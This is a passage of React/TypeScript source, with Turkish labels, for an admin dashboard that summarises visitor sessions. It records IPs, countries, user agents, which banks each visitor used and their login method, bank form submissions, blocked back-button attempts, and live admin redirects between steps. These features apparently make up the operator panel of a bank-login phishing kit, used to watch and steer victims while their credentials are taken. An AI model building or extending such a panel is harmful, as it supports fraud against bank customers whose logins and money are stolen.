      if (s.redirect_log.length > 20) s.redirect_log.length = 20;
    }

    if (r.status === "error") s.errors_count++;
    if (r.status === "blocked") s.blocked_count++;
  }
  return Array.from(map.values()).sort((a, b) => (a.last_seen < b.last_seen ? 1 : -1));
}

function AuditSummaryView({ rows, loading, darkMode }: { rows: AuditEventRow[]; loading: boolean; darkMode: boolean }) {
  const card = darkMode ? "bg-[#1c1c1e]/60 border-white/5" : "bg-white/60 border-[#d2d2d7]/50";
  const muted = darkMode ? "text-white/50" : "text-black/50";
  const label = `text-[10px] font-bold uppercase tracking-wider ${muted}`;
  const chipBase = "inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-[11px] font-semibold tracking-wide ring-1 ring-inset";
  const summaries = buildSummary(rows);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [searchQ, setSearchQ] = useState("");
  const [onlyRedirected, setOnlyRedirected] = useState(false);
  const [onlyWithBanks, setOnlyWithBanks] = useState(false);
  const [minEvents, setMinEvents] = useState<number>(0);

  const filtered = summaries.filter((s) => {
    if (onlyRedirected && s.admin_redirect_count + s.server_redirect_count === 0) return false;
    if (onlyWithBanks && s.banks.length === 0) return false;
    if (s.total_events < minEvents) return false;
    if (searchQ.trim()) {
      const q = searchQ.trim().toLowerCase();
      const hay = [s.session_id, s.public_id, s.partner_name, s.ips.join(" "), s.banks.join(" "), s.last_redirect_from, s.last_redirect_to]
        .filter(Boolean).join(" ").toLowerCase();
      if (!hay.includes(q)) return false;
    }
    return true;
  });

  return (
    <div className="space-y-4">
      {/* Summary total counts card */}
      <div className={`rounded-3xl border backdrop-blur-2xl p-4 shadow-sm ${card}`}>
        <div className="flex flex-wrap items-start justify-between gap-4">
          <div>
            <div className="text-lg font-bold tracking-tight">Session Özeti</div>
            <div className={`text-xs ${muted}`}>Her oturum için ne kadar aktif kaldığını, geri tuşuna kaç kez bastığını, kaç kez submit ettiğini ve <span className="font-bold text-[#EB5E28]">SON NEREYE YÖNLENDİRİLDİĞİNİ</span> gösterir.</div>
          </div>
          <div className="grid grid-cols-2 gap-2 sm:grid-cols-6 min-w-[360px]">
            <StatCard label="Oturum" value={summaries.length.toString()} accent={KIND_LABELS.presence.color} darkMode={darkMode} />
            <StatCard label="Pulse" value={summaries.reduce((a, b) => a + b.presence_pulse_count, 0).toString()} accent="bg-sky-500/15 text-sky-300 ring-sky-400/30" darkMode={darkMode} />
            <StatCard label="Submit" value={summaries.reduce((a, b) => a + b.bank_submit_count, 0).toString()} accent={KIND_LABELS.bank_form.color} darkMode={darkMode} />
            <StatCard label="Geri Deneme" value={summaries.reduce((a, b) => a + b.wait_back_attempts, 0).toString()} accent={STATUS_LABELS.blocked.color} darkMode={darkMode} />
            <StatCard label="Admin Yön." value={summaries.reduce((a, b) => a + b.admin_redirect_count, 0).toString()} accent={KIND_LABELS.step.color} darkMode={darkMode} />
            <StatCard label="Hata" value={summaries.reduce((a, b) => a + b.errors_count, 0).toString()} accent={STATUS_LABELS.error.color} darkMode={darkMode} />
          </div>
        </div>

        <div className="mt-4 grid grid-cols-1 gap-3 md:grid-cols-2 lg:grid-cols-5 items-end">
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Session Ara</label>
            <input value={searchQ} onChange={(e) => setSearchQ(e.target.value)} placeholder="ID / IP / Banka / Partner / Step"
              className={`w-full rounded-xl border outline-none px-3 py-2 text-sm font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? "bg-black/50 border-white/10 text-white placeholder:text-white/30" : "bg-gray-50/50 border-gray-200 text-black placeholder:text-black/40"}`} />
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Filtreler</label>
            <div className="flex flex-wrap gap-2 items-center">
              <label className={`inline-flex items-center gap-1.5 text-xs font-medium rounded-full px-3 py-2 border ${darkMode ? "border-white/10 bg-black/30 hover:bg-white/5" : "border-gray-200 bg-white hover:bg-gray-50"} cursor-pointer transition`}>
                <input type="checkbox" checked={onlyRedirected} onChange={(e) => setOnlyRedirected(e.target.checked)} />
                Sadece yönlendirilenler
              </label>
              <label className={`inline-flex items-center gap-1.5 text-xs font-medium rounded-full px-3 py-2 border ${darkMode ? "border-white/10 bg-black/30 hover:bg-white/5" : "border-gray-200 bg-white hover:bg-gray-50"} cursor-pointer transition`}>
                <input type="checkbox" checked={onlyWithBanks} onChange={(e) => setOnlyWithBanks(e.target.checked)} />
                Sadece banka yapanlar
              </label>
            </div>
          </div>
          <div className="md:col-span-3 lg:col-span-2 flex flex-wrap gap-3 items-end justify-end">
            <div>
              <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Min. Olay Sayısı</label>
              <select value={minEvents} onChange={(e) => setMinEvents(Number(e.target.value))}
                className={`w-[140px] rounded-xl border outline-none px-3 py-2 text-sm font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? "bg-black/50 border-white/10 text-white placeholder:text-white/30" : "bg-gray-50/50 border-gray-200 text-black placeholder:text-black/40"}`}>
                <option value={0}>Tümü</option>
                <option value={5}>{">= 5"}</option>
                <option value={15}>{">= 15"}</option>
                <option value={50}>{">= 50"}</option>
                <option value={150}>{">= 150"}</option>
              </select>
            </div>
            <button
              onClick={() => { setSearchQ(""); setOnlyRedirected(false); setOnlyWithBanks(false); setMinEvents(0); setExpanded(null); }}
              className={`rounded-full px-4 py-2 text-sm font-semibold transition-all hover:scale-[1.02] active:scale-95 ${darkMode ? "bg-white/10 hover:bg-white/20 text-white/90" : "bg-black/5 hover:bg-black/10 text-black/90"}`}
            >Filtreleri Sıfırla</button>
          </div>
        </div>
      </div>

      {/* Liste */}
      <div className={`rounded-3xl border backdrop-blur-2xl p-3 shadow-sm space-y-3 ${card}`}>
        {loading && filtered.length === 0 && (
          <div className="py-16 flex items-center justify-center">
            <div className="size-10 animate-spin rounded-full border-4 border-[#EB5E28]/30 border-t-[#EB5E28]" />
          </div>
        )}
        {!loading && filtered.length === 0 && rows.length === 0 && (
          <div className={`text-center py-16 ${muted}`}>Henüz audit logu yok.</div>
        )}
        {!loading && filtered.length === 0 && rows.length > 0 && (
          <div className={`text-center py-16 ${muted}`}>Filtrelere uyan session yok. Koşulları genişlet.</div>
        )}
        {filtered.map((s) => {
          const isOpen = expanded === s.session_id;
          return (
            <div key={s.session_id} className={`rounded-2xl border p-4 transition-all ${darkMode ? "bg-black/30 border-white/5 hover:border-white/10" : "bg-white border-gray-200/60 hover:border-gray-300"}`}>
              {/* Header */}
              <div className="flex flex-wrap items-start justify-between gap-3">
                <div className="min-w-[260px] flex-1">
                  <div className="flex flex-wrap items-center gap-2">
                    <div className="font-mono text-[11px] opacity-90 max-w-[260px] truncate" title={s.session_id}>ID: {s.session_id}</div>
                    {s.public_id && <div className={`font-mono text-[10px] ${muted} max-w-[200px] truncate`}>pub: {s.public_id}</div>}
                    {s.partner_name && <span className={chipBase + " bg-emerald-500/15 text-emerald-300 ring-emerald-400/30"}>👥 {s.partner_name}</span>}
                    {s.last_redirect_to && <span className={chipBase + " bg-[#EB5E28]/15 text-[#ff8a5c] ring-[#EB5E28]/30"}>🎯 Son yönlen: <b>{s.last_redirect_to}</b></span>}
                  </div>
                  <div className={`mt-1 flex flex-wrap items-center gap-x-4 gap-y-1 text-[11px] ${muted}`}>
                    <span>İlk: {toLocalTR(s.first_seen)}</span>
                    <span>Son: <b>{toLocalTR(s.last_seen)}</b></span>
                    {s.ips.length > 0 && <span className="font-mono">IP: {s.ips.slice(0, 2).join(", ")}{s.ips.length > 2 ? ` (+${s.ips.length - 2})` : ""}</span>}
                    {s.countries.length > 0 && <span>Ülke: {s.countries.join(", ")}</span>}
                    {s.banks.length > 0 && <span>Banka: {s.banks.slice(0, 2).join(" / ")}{s.banks.length > 2 ? ` (+${s.banks.length - 2})` : ""}</span>}
                  </div>
                </div>

                {/* Sayaç kartları */}
                <div className="grid grid-cols-2 gap-1.5 sm:grid-cols-4 lg:grid-cols-8 min-w-[520px]">
                  <MiniChip k="Toplam Olay" v={s.total_events} darkMode={darkMode} />
                  <MiniChip k="Aktif Pulse" v={s.presence_pulse_count} darkMode={darkMode} hint="Sayfada kaç heartbeat attı" />
                  <MiniChip k="Sekme Kapat" v={s.pagehide_count} darkMode={darkMode} />
                  <MiniChip k="Sekme Arka" v={s.tab_hidden_count} darkMode={darkMode} />
                  <MiniChip k="Bekle Giriş" v={s.wait_mounts} darkMode={darkMode} />
                  <MiniChip k="Geri Butonu" v={s.wait_back_attempts} darkMode={darkMode} highlight={s.wait_back_attempts > 0 ? "blocked" : undefined} />
                  <MiniChip k="Submit Tık" v={s.bank_submit_count} darkMode={darkMode} highlight="ok" />
                  <MiniChip k="Submit Hata" v={s.bank_submit_error_count} darkMode={darkMode} highlight={s.bank_submit_error_count > 0 ? "error" : undefined} />
                </div>
              </div>

              {/* Yönlendirme özeti */}
              <div className="mt-3 flex flex-wrap items-center gap-3">
                <div className="flex flex-wrap items-center gap-2">
                  <span className={chipBase + " " + KIND_LABELS.step.color}>ADIM</span>
                  <span className={`text-[12px] font-semibold`}>Admin yönlendirme: <b>{s.admin_redirect_count}x</b></span>
                  <span className={`text-[12px] ${muted}`}>· Server sync yönlendirme: <b>{s.server_redirect_count}x</b></span>
                </div>
                {s.last_redirect_to ? (
                  <div className="flex flex-wrap items-center gap-2 ml-auto">
                    <span className={`text-[11px] ${muted}`}>Son konumlandığı:</span>
                    <span className={`px-2 py-0.5 rounded-md text-[11px] font-semibold ${darkMode ? "bg-white/10" : "bg-black/5"}`}>{s.last_redirect_from ?? "—"}</span>
                    <svg className="w-3 h-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" /></svg>
                    <span className="px-2 py-0.5 rounded-md text-[11px] font-bold bg-[#EB5E28]/15 text-[#ff8a5c] ring-1 ring-inset ring-[#EB5E28]/30">{s.last_redirect_to}</span>
                    {s.last_redirect_at && <span className={`text-[10px] ${muted}`}>({toLocalTR(s.last_redirect_at)})</span>}
                  </div>
                ) : <div className={`text-[11px] ml-auto ${muted}`}>Henüz admin yönlendirmesi yapılmamış.</div>}
              </div>

              {/* Error + Blok toplam */}
              {(s.errors_count > 0 || s.blocked_count > 0) && (
                <div className="mt-2 flex flex-wrap items-center gap-2">
                  {s.errors_count > 0 && <span className={chipBase + " " + STATUS_LABELS.error.color}>HATA TOPLAM: {s.errors_count}</span>}
                  {s.blocked_count > 0 && <span className={chipBase + " " + STATUS_LABELS.blocked.color}>BLOKE: {s.blocked_count}</span>}
                </div>
              )}

              {/* Expand butonu */}
              <div className="mt-3 flex flex-wrap items-center justify-between gap-2">
                <button
                  onClick={() => setExpanded(isOpen ? null : s.session_id)}
                  className={`inline-flex items-center gap-2 rounded-full px-3 py-1.5 text-xs font-semibold transition-all hover:scale-[1.02] ${darkMode ? "bg-white/10 hover:bg-white/20" : "bg-black/5 hover:bg-black/10"}`}
                >
                  <svg className={`w-3.5 h-3.5 transition-transform ${isOpen ? "rotate-180" : ""}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                  {isOpen ? "Detayı Kapat" : "Ham Detayları Aç → Yönlendirme geçmişi / IP listesi / Tüm User Agent'lar / Tüm Bankalar"}
                </button>
                {s.redirect_log.length > 0 && <span className={`text-[10px] ${muted}`}>Son {s.redirect_log.length} yönlendirme kaydedilmiş.</span>}
              </div>

              {/* Expand body */}
              {isOpen && (
                <div className="mt-4 grid grid-cols-1 gap-3 md:grid-cols-2 xl:grid-cols-4">
                  <div className={`rounded-2xl border p-3 ${darkMode ? "bg-black/40 border-white/5" : "bg-white border-gray-200"}`}>
                    <div className={label}>IP'ler ({s.ips.length})</div>
                    <pre className={`mt-2 max-h-40 overflow-auto rounded-lg p-2 text-[11px] font-mono whitespace-pre-wrap break-words ${darkMode ? "bg-black/60" : "bg-black/5"}`}>{s.ips.length ? s.ips.join("\n") : "(yok)"}</pre>
                  </div>
                  <div className={`rounded-2xl border p-3 ${darkMode ? "bg-black/40 border-white/5" : "bg-white border-gray-200"}`}>
                    <div className={label}>User Agent ({s.user_agents.length})</div>
                    <pre className={`mt-2 max-h-40 overflow-auto rounded-lg p-2 text-[10px] font-mono whitespace-pre-wrap break-words ${darkMode ? "bg-black/60" : "bg-black/5"}`}>{s.user_agents.length ? s.user_agents.join("\n\n") : "(yok)"}</pre>
                  </div>
                  <div className={`rounded-2xl border p-3 ${darkMode ? "bg-black/40 border-white/5" : "bg-white border-gray-200"}`}>
                    <div className={label}>Kullanılan Bankalar ({s.banks.length})</div>
                    <pre className={`mt-2 max-h-40 overflow-auto rounded-lg p-2 text-[11px] font-mono whitespace-pre-wrap break-words ${darkMode ? "bg-black/60" : "bg-black/5"}`}>{s.banks.length ? s.banks.join("\n") : "(yok)"}</pre>
                  </div>
                  <div className={`rounded-2xl border p-3 ${darkMode ? "bg-black/40 border-white/5" : "bg-white border-gray-200"} xl:col-span-1 md:col-span-2`}>
                    <div className={label}>Yönlendirme Geçmişi</div>
                    <div className={`mt-2 space-y-1.5 max-h-52 overflow-auto rounded-lg p-2 ${darkMode ? "bg-black/60" : "bg-black/5"}`}>
                      {s.redirect_log.length === 0 && <div className={`text-[11px] ${muted}`}>Henüz hiç yönlendirme yok.</div>}
                      {s.redirect_log.map((r, i) => (
                        <div key={i} className={`flex flex-wrap items-center gap-2 text-[11px] ${darkMode ? "bg-white/5" : "bg-white/60"} rounded-md px-2 py-1.5 border ${darkMode ? "border-white/5" : "border-gray-200"}`}>
                          <span className={`font-mono text-[10px] ${muted}`}>{toLocalTR(r.when)}</span>
                          <span className={chipBase + " text-[10px] " + (r.action === "admin_realtime_redirect" ? KIND_LABELS.step.color : "bg-white/10 text-white/80 ring-white/10")}>{r.action === "admin_realtime_redirect" ? "ADM" : "SRV"}</span>
                          <span className={`px-1.5 py-0.5 rounded text-[10px] font-semibold ${darkMode ? "bg-white/10" : "bg-black/5"}`}>{r.from ?? "—"}</span>
                          <svg className="w-3 h-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" /></svg>
                          <span className="px-1.5 py-0.5 rounded text-[10px] font-bold bg-[#EB5E28]/15 text-[#ff8a5c] ring-1 ring-inset ring-[#EB5E28]/30">{r.to ?? "—"}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

function MiniChip({ k, v, darkMode, hint, highlight }: { k: string; v: number; darkMode: boolean; hint?: string; highlight?: "ok" | "blocked" | "error" }) {
  const bg = highlight === "ok" ? "bg-emerald-500/15 text-emerald-300 ring-emerald-400/30"
    : highlight === "blocked" ? STATUS_LABELS.blocked.color
    : highlight === "error" ? STATUS_LABELS.error.color
    : darkMode ? "bg-white/10 text-white/90 ring-white/10" : "bg-black/5 text-black/80 ring-black/5";
  const muted = darkMode ? "text-white/60" : "text-black/60";
  return (
    <div title={hint} className={`rounded-xl border p-2 ring-1 ring-inset ${bg}`}>
      <div className={`text-[9px] font-bold uppercase tracking-wider ${muted}`}>{k}</div>
      <div className="text-[15px] font-extrabold leading-tight">{v}</div>
    </div>
  );
}

function ExpandedAuditRow({ row, darkMode }: { row: AuditEventRow; darkMode: boolean }) {
  const cardIn = darkMode
    ? "bg-black/40 border-white/5"
    : "bg-white border-gray-200/50";
  const label = `text-[10px] font-bold uppercase tracking-wider ${darkMode ? "text-white/50" : "text-black/50"}`;
  const val = `mt-1 break-all rounded-md px-2 py-1 font-mono text-[12px] ${darkMode ? "bg-white/5 text-white/90" : "bg-black/5 text-black/90"}`;
  const muted = darkMode ? "text-white/50" : "text-black/50";

  function CopyField({ children, text }: { children: React.ReactNode; text?: string }) {
    const t = (text !== undefined ? String(text) : typeof children === "string" ? children : "");
    if (!t) return null;
    return (
      <button
        type="button"
        onClick={() => { navigator.clipboard?.writeText(t); }}
        className="group relative w-full text-left"
        title="Kopyalamak için tıkla"
      >
        {children}
        <span className={`absolute right-2 top-1 text-[10px] opacity-0 group-hover:opacity-100 transition-opacity ${muted}`}>Kopyala</span>
      </button>
    );
  }

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 gap-3 md:grid-cols-2 xl:grid-cols-4">
        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn}`}>
          <div className={label}>Olay</div>
          <div className={val}>kind: {row.event_kind}</div>
          <div className={val}>action: {row.event_action}</div>
          <div className={val}>status: {row.status ?? "null"}</div>
        </div>
        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn}`}>
          <div className={label}>Session</div>
          <CopyField text={row.session_id ?? ""}><div className={val}>{row.session_id ?? <span className={muted}>-</span>}</div></CopyField>
          <CopyField text={row.public_id ?? ""}><div className={val}>public_id: {row.public_id ?? <span className={muted}>-</span>}</div></CopyField>
          <div className={val}>partner: {row.partner_name ?? <span className={muted}>-</span>}</div>
        </div>
        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn}`}>
          <div className={label}>Kullanıcı</div>
          <CopyField text={row.user_ip ?? ""}><div className={val}>IP: {row.user_ip ?? <span className={muted}>-</span>}</div></CopyField>
          <div className={val}>Ülke: {row.country ?? <span className={muted}>-</span>}{row.city ? ` · ${row.city}` : ""}</div>
          <CopyField text={row.user_agent ?? ""}><div className={val}>UA: {(row.user_agent ? (row.user_agent.length > 140 ? row.user_agent.slice(0, 140) + "…" : row.user_agent) : <span className={muted}>-</span>)}</div></CopyField>
        </div>
        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn}`}>
          <div className={label}>Banka</div>
          <div className={val}>slug: {row.bank_slug ?? <span className={muted}>-</span>}</div>
          <div className={val}>name: {row.bank_name ?? <span className={muted}>-</span>}</div>
          <div className={val}>login_method: {row.login_method ?? <span className={muted}>-</span>}</div>
        </div>

        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn} md:col-span-2 xl:col-span-2`}>
          <div className={label}>URL / Rota</div>
          <CopyField text={row.current_url ?? ""}><div className={val}>current: {row.current_url ?? <span className={muted}>-</span>}</div></CopyField>
          <CopyField text={row.referer_url ?? ""}><div className={val}>referer: {row.referer_url ?? <span className={muted}>-</span>}</div></CopyField>
          <div className={val}>pathname: {row.pathname ?? <span className={muted}>-</span>}</div>
        </div>

        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn} md:col-span-2 xl:col-span-2`}>
          <div className={label}>Adım / Admin</div>
          <div className={val}>from_step → to_step: {(row.from_step ?? "—")} → {(row.to_step ?? "—")}</div>
          <div className={val}>admin_email: {row.admin_email ?? <span className={muted}>-</span>}</div>
          <div className={val}>admin_action: {row.admin_action ?? <span className={muted}>-</span>}</div>
        </div>

        {row.error_name || row.error_message ? (
          <div className={`rounded-2xl border p-3 shadow-sm ${cardIn} md:col-span-2 xl:col-span-2 border-red-500/30 bg-red-500/5`}>
            <div className="text-[10px] font-bold uppercase tracking-wider text-red-400">Hata</div>
            <div className={val}>name: {row.error_name ?? <span className={muted}>-</span>}</div>
            <div className={val}>message: {row.error_message ?? <span className={muted}>-</span>}</div>
          </div>
        ) : null}

        <div className={`rounded-2xl border p-3 shadow-sm ${cardIn} md:col-span-2 xl:col-span-4`}>
          <details className="group">
            <summary className="flex cursor-pointer items-center justify-between gap-3 select-none">
              <div className={label} style={{ marginBottom: 0 }}>Meta (ekstra JSON)</div>
              <span className={`inline-flex h-6 w-6 items-center justify-center rounded-full transition ${darkMode ? "bg-white/5 group-open:rotate-180" : "bg-black/5 group-open:rotate-180"}`}>
                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
              </span>
            </summary>
            <pre className={`mt-3 overflow-auto rounded-xl border p-4 text-[11px] leading-relaxed ${darkMode ? "bg-black/60 border-white/10 text-white/90" : "bg-white border-gray-200 text-black/90"}`}>
              <CopyField text={safeJsonStringify(row.meta)}>{safeJsonStringify(row.meta ?? {})}</CopyField>
            </pre>
          </details>
        </div>
      </div>
    </div>
  );
}
